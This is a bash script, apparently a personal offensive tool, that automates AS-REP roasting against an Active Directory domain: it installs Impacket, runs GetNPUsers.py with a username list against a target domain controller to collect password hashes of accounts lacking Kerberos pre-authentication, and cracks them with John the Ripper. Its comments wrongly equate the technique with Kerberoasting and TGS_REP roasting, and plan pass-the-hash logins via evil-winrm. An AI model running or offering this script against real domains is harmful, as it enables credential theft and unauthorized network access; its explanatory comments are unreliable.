#!/bin/bash
#This script will test with a user supplied username list if any of the accounts or potential accounts have no sign in turn on in Active Directory
#If this is on it allows for "Kerber Roasting" or also known as TGS_REP Roasting. Which will allow us to get the encrypted hash which we are able to crack offline extremely quickly.
#While this attack is effective IF the option is on keep in mind the password is still being bruteforced and does need to be in the supplied list.
function Installing_Requirments() { # This function installs all neccissary requirments
mkdir .Requirments && cd .Requirments
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/
sudo apt install python3-pip
pip3 install -r requirements.txt
sudo python3 setup.py install
}
function Aquiring_No_Pass_Hashes() { # This function is where we bruteforce the usernames and if one is correct and has no sign in turned on we can get the password hash
        clear
        echo 'Thank you for using YSSVirus Active-Directory no password account checker!

Please wait while we gather any hashes we can find with the associated username list!'
        echo ''
        GetNPUsers.py -usersfile $UserList -dc-ip $IP -no-pass $Domain/ > Hashes.txt
        cat Hashes.txt | grep -v 'doesn\|Error\|Impacket' > tmp.txt && rm Hashes.txt && mv tmp.txt Hashes.txt
        clear
        cat Hashes.txt
        sleep 3
}
function Crack_the_Hashes() { #This is where we crack the hashes that we got from the previous functio. They are also saved in a file which allows them to be cracked later on!
        clear
        echo ''
        john --wordlist=$PasswordList Hashes.txt
        echo ''
        sleep 3
        clear
        echo ''
        john Hashes.txt --show
}
function Main_Function() {
        if [ $# -eq 4 ]; then #This will test if there is enough arguments if there is not it defaults to user input
        clear
        echo ''
        Aquiring_No_Pass_Hashes $1 $2 $3 $4
        Crack_the_Hashes $1 $2 $3 $4
else #This else statement is where it redirects to if there isnt enough arguments
        clear
        echo 'The scipt defaults to run on interactive mode... to run with arguments Please follow the Example Setup'
        echo ''
        echo 'Example: bash Script.sh Domain.local IP Location_Of_User-List Location_Of_Password_list'
        echo ''
        echo ''
        echo 'What is the IP of the server your attacking?'
        read IP
        echo ''
        echo 'What is the domain of the server that your attacking?'
        read Domain
        echo ''
        echo 'What is the User-list you want to use?'
        read UserList
        echo ''
        echo 'What Password-list would you like to use to crack internal service accounts if we successfully get an account'
        read PasswordList
        Aquiring_No_Pass_Hashes
        Crack_the_Hashes
fi
}
Domain=$1
IP=$2
UserList=$3
PasswordList=$4
echo 'Would you like to install the dependencies? (Yes/No)'
read Dependencie_Answer
clear
if [[ $Dependencie_Answer == No ]] || [[ $Dependencie_Answer == no ]] || [[ $Dependencie_Answer == N ]] || [[ $Dependencie_Answer == n ]]; then
        Main_Function $1 $2 $3 $4
else
        Installing_Requirments  $1 $2 $3 $4
        Main_Function $1 $2 $3 $4
fi
#in the future this will try to pull from enum4linux and anything thhat could get usernames thats normally around AD
#I also want it to try to create sessions with the hashes by passing the hash through evil-winrm

